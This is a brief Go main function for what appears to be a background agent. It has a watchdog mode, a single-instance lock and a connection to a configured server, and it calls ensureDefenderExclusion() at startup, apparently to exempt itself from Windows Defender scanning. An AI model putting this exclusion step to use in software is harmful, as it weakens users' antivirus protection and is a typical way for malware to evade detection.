package main

import (
	"fmt"
	"os"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "-watchdog" {
		runWatchdog()
		return
	}

	s := resolveSettings()
	if !acquireSingleInstance() {
		return
	}
	ensureDefenderExclusion()
	if version == "dev" {
		fmt.Println("Server:", s.Server)
		fmt.Println("Device:", s.DeviceID)
	}
	newAgent(s).run()
}
